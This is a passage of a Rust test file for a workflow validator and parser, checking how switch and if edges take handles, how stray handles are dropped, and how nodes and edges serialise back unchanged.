        .push(edge(r#"{"from":"route","to":"fetch","handle":"default"}"#));
    let repeated = messages(&w)
        .into_iter()
        .filter(|m| m.contains("more than one edge"))
        .count();
    assert_eq!(repeated, 1);
    // A handle is required on every out edge.
    let mut missing = ok(&["bug"]);
    missing
        .edges
        .push(edge(r#"{"from":"route","to":"report"}"#));
    assert!(flags(&missing, "without a case or \"default\" handle"));
    // The same node may take two handles to one place.
    assert_eq!(validate_workflow(&ok(&["bug", "feature"])), vec![]);
}

#[test]
fn an_if_edge_accepts_only_true_and_false() {
    let mut w = example();
    w.nodes.push(node(
        r#"{"id":"gate","type":"if","condition":"{{fetch.tickets}} not empty"}"#,
    ));
    w.edges.push(edge(r#"{"from":"fetch","to":"gate"}"#));
    w.edges
        .push(edge(r#"{"from":"gate","to":"report","handle":"default"}"#));
    assert!(flags(&w, "use \"true\" or \"false\""));
    w.edges.last_mut().unwrap().handle = Some(Handle::False);
    assert_eq!(validate_workflow(&w), vec![]);
}

#[test]
fn a_stray_handle_on_a_plain_or_loop_edge_is_dropped_when_a_workflow_is_read() {
    let text = EXAMPLE_JSON
        .replace(
            r#"{ "from": "fetch", "to": "each" }"#,
            r#"{ "from": "fetch", "to": "each", "handle": "bug" }"#,
        )
        .replace(
            r#""to": "dev", "loop""#,
            r#""to": "dev", "handle": "bug", "loop""#,
        );
    assert!(text.contains(r#""handle": "bug""#));
    assert_eq!(text.matches(r#""handle": "bug""#).count(), 2);
    let w = super::parse::parse_workflow(&json(&text)).expect("a workflow");
    assert!(w.edges.iter().all(|e| e.handle.is_none()));
    assert_eq!(validate_workflow(&w), vec![]);
    assert_eq!(w, example());
    assert!(!serde_json::to_string(&w).unwrap().contains("handle"));
}

#[test]
fn a_stray_handle_on_a_loop_edge_of_a_switch_is_dropped() {
    let mut w = with_switch(SWITCH_OK, &["bug", "feature", "default"]);
    w.edges.push(edge(
        r#"{"from":"route","to":"fetch","loop":{"maxRounds":2,"decide":"mono"}}"#,
    ));
    let mut raw = serde_json::to_value(&w).unwrap();
    raw["edges"].as_array_mut().unwrap().last_mut().unwrap()["handle"] = json!("bug");
    let read = super::parse::parse_workflow(&Json::from(&raw)).expect("a workflow");
    assert!(read.edges.last().unwrap().handle.is_none());
    assert!(!flags(&read, "handle"));
}

#[test]
fn a_switch_case_with_an_absolute_path_is_flagged() {
    let w = with_switch(
        r#""value":"{{fetch.tickets}}","cases":["/Users/x/repo/notes.md"]"#,
        &["default"],
    );
    assert!(flags(&w, "cases contains an absolute path"));
}

#[test]
fn a_handle_on_any_other_node_is_still_flagged() {
    let mut w = example();
    for e in w.edges.iter_mut().filter(|e| e.from == "fetch") {
        e.handle = Some(Handle::named("bug"));
    }
    assert!(flags(&w, "only If and Switch nodes have handles"));
}

#[test]
fn handles_read_and_write_as_plain_strings() {
    assert_eq!(Handle::named("true"), Handle::True);
    assert_eq!(Handle::named("false"), Handle::False);
    assert_eq!(Handle::named("bug"), Handle::Case("bug".into()));
    for name in ["true", "false", "default", "a b", "日本"] {
        let edge = edge(&json!({"from": "a", "to": "b", "handle": name}).to_string());
        let written = serde_json::to_value(&edge).unwrap();
        assert_eq!(written["handle"], name);
        assert_eq!(super::parse::parse_edge(&Json::from(&written)), Some(edge));
    }
    // An If edge serialises exactly as before: a bare "true" or "false" string.
    let mut e = Edge::new("gate", "yes");
    e.handle = Some(Handle::True);
    assert_eq!(
        serde_json::to_string(&e).unwrap(),
        r#"{"from":"gate","to":"yes","handle":"true"}"#
    );
    e.handle = Some(Handle::False);
    assert_eq!(
        serde_json::to_string(&e).unwrap(),
        r#"{"from":"gate","to":"yes","handle":"false"}"#
    );
    // No handle and an empty one both mean none.
    assert_eq!(edge_handle(r#"{"from":"a","to":"b"}"#), None);
    assert_eq!(edge_handle(r#"{"from":"a","to":"b","handle":""}"#), None);
}

fn edge_handle(text: &str) -> Option<Handle> {
    edge(text).handle
}

#[test]
fn a_switch_node_reads_and_writes_back_unchanged() {
    let text = r#"{"id":"route","type":"switch","value":"{{a.kind}}","cases":["x","y"],"decide":"mono","question":"q"}"#;
    let n = node(text);
    assert_eq!(
        n.kind,
        NodeKind::Switch {
            value: Some("{{a.kind}}".into()),
            cases: vec!["x".into(), "y".into()],
            decide: Some(Decide::Mono),
            question: Some("q".into()),
        }
    );
    assert_eq!(
        serde_json::to_value(&n).unwrap(),
        serde_json::from_str::<Value>(text).unwrap()
    );
    // Entries of `cases` that are not strings are dropped; no `cases` at all is an empty list.
    let odd = node(r#"{"id":"r","type":"switch","value":"v","cases":["a",3,null,"b"]}"#);
    assert!(matches!(&odd.kind, NodeKind::Switch { cases, .. } if cases == &["a", "b"]));
    let none = node(r#"{"id":"r","type":"switch","value":"v"}"#);
    assert!(matches!(&none.kind, NodeKind::Switch { cases, .. } if cases.is_empty()));
}
